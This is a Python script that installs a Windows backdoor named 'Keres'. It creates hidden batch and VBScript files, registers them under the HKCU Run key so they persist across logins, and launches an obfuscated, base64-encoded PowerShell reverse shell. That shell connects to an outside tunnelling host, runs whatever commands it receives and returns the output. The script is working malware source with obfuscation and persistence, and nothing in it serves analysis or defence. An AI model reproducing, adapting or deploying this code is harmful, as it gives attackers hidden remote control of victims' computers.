import subprocess

import os




# Get the home directory of the current user
home_directory = os.path.expanduser("~")

# Define the path for the batch file in the home directory
batch_file_path = os.path.join(home_directory, 'Keres.bat')

# Define the path for the VBScript file
vbs_script_path = os.path.join(home_directory, 'ExecKeres.vbs')

# Create the VBScript content with the dynamic batch file path
vbs_script_content = f'''
Set objShell = CreateObject("WScript.Shell")


batchFilePath = "{batch_file_path}"


objShell.Run batchFilePath, 0, True
'''






#""""""""""""""""""""""""""""""""""""""""""""""""""
ps_command = ''' CgAkAHUAbgBpAHEAdQBlAEkAZABlAG4AdABpAGYAaQBlAHIAIAA9ACAAIgBLAGUAcgBlAHMAIgAKACQAbQBhAHgAUAByAG8AYwBlAHMAcwBlAHMAIAA9ACAAMQAKACQAcwBwAGEAdwBuAGUAZABQAHIAbwBjAGUAcwBzAGUAcwAgAD0AIAAwAAoACgB3AGgAaQBsAGUAIAAoACQAdAByAHUAZQApAHsACgAgACAAIAAgACQAaQBzAFIAdQBuAG4AaQBuAGcAIAA9ACAARwBlAHQALQBQAHIAbwBjAGUAcwBzACAALQBOAGEAbQBlACAAcABvAHcAZQByAHMAaABlAGwAbAAgAC0ARQByAHIAbwByAEEAYwB0AGkAbwBuACAAUwBpAGwAZQBuAHQAbAB5AEMAbwBuAHQAaQBuAHUAZQAgAHwAIABXAGgAZQByAGUALQBPAGIAagBlAGMAdAAgAHsAIAAkAF8ALgBDAG8AbQBtAGEAbgBkAEwAaQBuAGUAIAAtAGwAaQBrAGUAIAAiACoAJAB1AG4AaQBxAHUAZQBJAGQAZQBuAHQAaQBmAGkAZQByACoAIgAgAH0ACgAKACAAIAAgACAAaQBmACAAKAAtAG4AbwB0ACAAJABpAHMAUgB1AG4AbgBpAG4AZwAgAC0AYQBuAGQAIAAkAHMAcABhAHcAbgBlAGQAUAByAG8AYwBlAHMAcwBlAHMAIAAtAGwAdAAgACQAbQBhAHgAUAByAG8AYwBlAHMAcwBlAHMAKQAgAHsACgAgACAAIAAgACAAIAAgACAAJABjAG8AbgBuAGUAYwB0AGkAbwBuAFQAZQBzAHQAIAA9ACAAVABlAHMAdAAtAEMAbwBuAG4AZQBjAHQAaQBvAG4AIAAtAEMAbwBtAHAAdQB0AGUAcgBOAGEAbQBlACAAJwByAGUAdAB1AHIAbgBzAC0AZwBvAHYAZQByAG4AaQBuAGcALgBnAGwALgBhAHQALgBwAGwAeQAuAGcAZwAnACAALQBDAG8AdQBuAHQAIAAxACAALQBRAHUAaQBlAHQACgAKACAAIAAgACAAIAAgACAAIABpAGYAIAAoACQAYwBvAG4AbgBlAGMAdABpAG8AbgBUAGUAcwB0ACkAIAB7AAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAUwB0AGEAcgB0AC0AUAByAG8AYwBlAHMAcwAgACQAUABTAEgATwBNAEUAXABwAG8AdwBlAHIAcwBoAGUAbABsAC4AZQB4AGUAIAAtAEEAcgBnAHUAbQBlAG4AdABMAGkAcwB0ACAAewAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAJAB1AG4AaQBxAHUAZQBJAGQAZQBuAHQAaQBmAGkAZQByAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAkAGMAbABpAGUAbgB0ACAAPQAgAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABTAHkAcwB0AGUAbQAuAE4AZQB0AC4AUwBvAGMAawBlAHQAcwAuAFQAYwBwAEMAbABpAGUAbgB0AAoACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgAHQAcgB5ACAAewAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAkAGMAbABpAGUAbgB0AC4AQwBvAG4AbgBlAGMAdAAoACcAcgBlAHQAdQByAG4AcwAtAGcAbwB2AGUAcgBuAGkAbgBnAC4AZwBsAC4AYQB0AC4AcABsAHkALgBnAGcAJwAsACAAMwAzADkAMgA1ACkACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAJABzAHQAcgBlAGEAbQAgAD0AIAAkAGMAbABpAGUAbgB0AC4ARwBlAHQAUwB0AHIAZQBhAG0AKAApAAoACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAdwBoAGkAbABlACAAKAAkAHQAcgB1AGUAKQAgAHsACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIABpAGYAIAAoAC0AbgBvAHQAIAAkAGMAbABpAGUAbgB0AC4AQwBvAG4AbgBlAGMAdABlAGQAKQAgAHsACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgAFcAcgBpAHQAZQAtAEgAbwBzAHQAIAAiAEMAbwBuAG4AZQBjAHQAaQBvAG4AIABsAG8AcwB0AC4AIABSAGUAYwBvAG4AbgBlAGMAdABpAG4AZwAuAC4ALgAiAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIABTAHQAYQByAHQALQBTAGwAZQBlAHAAIAAtAFMAZQBjAG8AbgBkAHMAIAA2ADAAIAAgACMAIABXAGEAaQB0ACAAZgBvAHIAIAA2ADAAIABzAGUAYwBvAG4AZABzACAAYgBlAGYAbwByAGUAIABhAHQAdABlAG0AcAB0AGkAbgBnACAAdABvACAAcgBlAGMAbwBuAG4AZQBjAHQACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgAGIAcgBlAGEAawAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgAH0ACgAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACQAYgB5AHQAZQBzACAAPQAgAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABiAHkAdABlAFsAXQAgADYANQA1ADMANQAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACQAaQAgAD0AIAAkAHMAdAByAGUAYQBtAC4AUgBlAGEAZAAoACQAYgB5AHQAZQBzACwAIAAwACwAIAAkAGIAeQB0AGUAcwAuAEwAZQBuAGcAdABoACkACgAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgAGkAZgAgACgAJABpACAALQBsAGUAIAAwACkAIAB7AAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIABXAHIAaQB0AGUALQBIAG8AcwB0ACAAIgBDAG8AbgBuAGUAYwB0AGkAbwBuACAAdABvACAAcwBlAHIAdgBlAHIAIABjAGwAbwBzAGUAZAAuACAAUgBlAGMAbwBuAG4AZQBjAHQAaQBuAGcALgAuAC4AIgAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAUwB0AGEAcgB0AC0AUwBsAGUAZQBwACAALQBTAGUAYwBvAG4AZABzACAANgAwACAAIAAjACAAVwBhAGkAdAAgAGYAbwByACAANgAwACAAcwBlAGMAbwBuAGQAcwAgAGIAZQBmAG8AcgBlACAAYQB0AHQAZQBtAHAAdABpAG4AZwAgAHQAbwAgAHIAZQBjAG8AbgBuAGUAYwB0AAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIABiAHIAZQBhAGsACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAB9AAoACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAkAGQAYQB0AGEAIAA9ACAAWwBTAHkAcwB0AGUAbQAuAFQAZQB4AHQALgBFAG4AYwBvAGQAaQBuAGcAXQA6ADoAQQBTAEMASQBJAC4ARwBlAHQAUwB0AHIAaQBuAGcAKAAkAGIAeQB0AGUAcwAsACAAMAAsACAAJABpACkACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAkAHMAZQBuAGQAYgBhAGMAawAgAD0AIAAoAGkAZQB4ACAAJABkAGEAdABhACAAMgA+ACYAMQAgAHwAIABPAHUAdAAtAFMAdAByAGkAbgBnACkACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAkAHMAZQBuAGQAYgBhAGMAawAyACAAPQAgACQAcwBlAG4AZABiAGEAYwBrACAAKwAgACcAUABTACAAJwAgACsAIAAoAEcAZQB0AC0ATABvAGMAYQB0AGkAbwBuACkALgBQAGEAdABoACAAKwAgACcAPgAgACcACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAkAHMAZQBuAGQAYgB5AHQAZQAgAD0AIABbAFMAeQBzAHQAZQBtAC4AVABlAHgAdAAuAEUAbgBjAG8AZABpAG4AZwBdADoAOgBBAFMAQwBJAEkALgBHAGUAdABCAHkAdABlAHMAKAAkAHMAZQBuAGQAYgBhAGMAawAyACkACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAkAHMAdAByAGUAYQBtAC4AVwByAGkAdABlACgAJABzAGUAbgBkAGIAeQB0AGUALAAgADAALAAgACQAcwBlAG4AZABiAHkAdABlAC4ATABlAG4AZwB0AGgAKQAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACQAcwB0AHIAZQBhAG0ALgBGAGwAdQBzAGgAKAApAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgAH0ACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgAH0AIABjAGEAdABjAGgAIAB7AAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgAFcAcgBpAHQAZQAtAEgAbwBzAHQAIAAiAEUAcgByAG8AcgA6ACAAJABfACIACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgAH0AIABmAGkAbgBhAGwAbAB5ACAAewAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIABpAGYAIAAoACQAcwB0AHIAZQBhAG0AKQAgAHsAIAAkAHMAdAByAGUAYQBtAC4AQwBsAG8AcwBlACgAKQAgAH0ACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAaQBmACAAKAAkAGMAbABpAGUAbgB0ACkAIAB7ACAAJABjAGwAaQBlAG4AdAAuAEMAbABvAHMAZQAoACkAIAB9AAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAAgACAAIAB9AAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAfQAgAC0AVwBpAG4AZABvAHcAUwB0AHkAbABlACAASABpAGQAZABlAG4ACgAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgACQAcwBwAGEAdwBuAGUAZABQAHIAbwBjAGUAcwBzAGUAcwArACsACgAgACAAIAAgACAAIAAgACAAfQAgAGUAbABzAGUAIAB7AAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAVwByAGkAdABlAC0ASABvAHMAdAAgACIATgBvACAAYwBvAG4AbgBlAGMAdABpAG8AbgAgAHQAbwAgAHQAaABlACAAcwBlAHIAdgBlAHIALgAgAFMAawBpAHAAcABpAG4AZwAgAHAAcgBvAGMAZQBzAHMAIABzAHAAYQB3AG4ALgAiAAoAIAAgACAAIAAgACAAIAAgAH0ACgAgACAAIAAgAH0AIABlAGwAcwBlAGkAZgAgACgAJABzAHAAYQB3AG4AZQBkAFAAcgBvAGMAZQBzAHMAZQBzACAALQBnAGUAIAAkAG0AYQB4AFAAcgBvAGMAZQBzAHMAZQBzACkAIAB7AAoAIAAgACAAIAAgACAAIAAgAFcAcgBpAHQAZQAtAEgAbwBzAHQAIAAiAE0AYQB4AGkAbQB1AG0AIABuAHUAbQBiAGUAcgAgAG8AZgAgAHAAcgBvAGMAZQBzAHMAZQBzACAAcgBlAGEAYwBoAGUAZAAuACAAUwBrAGkAcABwAGkAbgBnACAAcAByAG8AYwBlAHMAcwAgAHMAcABhAHcAbgAuACIACgAgACAAIAAgAH0AIABlAGwAcwBlACAAewAKACAAIAAgACAAIAAgACAAIABXAHIAaQB0AGUALQBIAG8AcwB0ACAAIgBTAGMAcgBpAHAAdAAgAGkAcwAgAGEAbAByAGUAYQBkAHkAIAByAHUAbgBuAGkAbgBnAC4AIgAKACAAIAAgACAAfQAKAAoAIAAgACAAIAAjACAAQwBvAHUAbgB0ACAAcAByAG8AYwBlAHMAcwBlAHMAIABhAGYAdABlAHIAIABhACAANgAwAC0AcwBlAGMAbwBuAGQAIAB3AGEAaQB0AAoAIAAgACAAIABTAHQAYQByAHQALQBTAGwAZQBlAHAAIAAtAFMAZQBjAG8AbgBkAHMAIAA2ADAACgAgACAAIAAgACQAcwBwAGEAdwBuAGUAZABQAHIAbwBjAGUAcwBzAGUAcwAgAD0AIAAoAEcAZQB0AC0AUAByAG8AYwBlAHMAcwAgAC0ATgBhAG0AZQAgAHAAbwB3AGUAcgBzAGgAZQBsAGwAIAAtAEUAcgByAG8AcgBBAGMAdABpAG8AbgAgAFMAaQBsAGUAbgB0AGwAeQBDAG8AbgB0AGkAbgB1AGUAIAB8ACAAVwBoAGUAcgBlAC0ATwBiAGoAZQBjAHQAIAB7ACAAJABfAC4AQwBvAG0AbQBhAG4AZABMAGkAbgBlACAALQBsAGkAawBlACAAIgAqACQAdQBuAGkAcQB1AGUASQBkAGUAbgB0AGkAZgBpAGUAcgAqACIAIAB9ACkALgBDAG8AdQBuAHQACgB9AAoACgA='''
#stp



# """"""""""""""f'reg.exe add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v Merikh /t REG_SZ /d \\C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -NoProfile -ExecutionPolicy Bypass -EncodedCommand {encoded_ps_command}',
# powershell_com =f'''New-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "Keres" -Value "{batch_file_path}"'''


command=f'''@echo off 
powershell.exe -NoProfile -ExecutionPolicy Bypass -EncodedCommand {ps_command}
'''

    

# """"""""""""""""""
try:
    #subprocess.run(["powershell", "-NoProfile", "-ExecutionPolicy", "Bypass","-EncodedCommand", encoded_ps_command], shell=True)
    #subprocess.run(["powershell", "-NoProfile", "-ExecutionPolicy", "Bypass", "-Command", powershell_com], shell=True)
    subprocess.run(args=["reg", "add", "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run",
                       "/v", "Keres", "/t", "REG_SZ", "/d", f"{vbs_script_path}", "/f"], shell=True)
    with open(batch_file_path, 'w') as batch_file:
        batch_file.write(command)
    with open(vbs_script_path, 'w') as vbs_script:
        vbs_script.write(vbs_script_content)
    subprocess.run(['attrib', '+h', batch_file_path], shell=True)
    subprocess.run(['attrib', '+h', vbs_script_path], shell=True)
    print(f"VBScript file created at: {vbs_script_path}")
    # Execute the batch file
    subprocess.run(["wscript", vbs_script_path])
       
    print("PowerShell command executed successfully.")
except subprocess.CalledProcessError as e:
    print("Error executing PowerShell command:", e)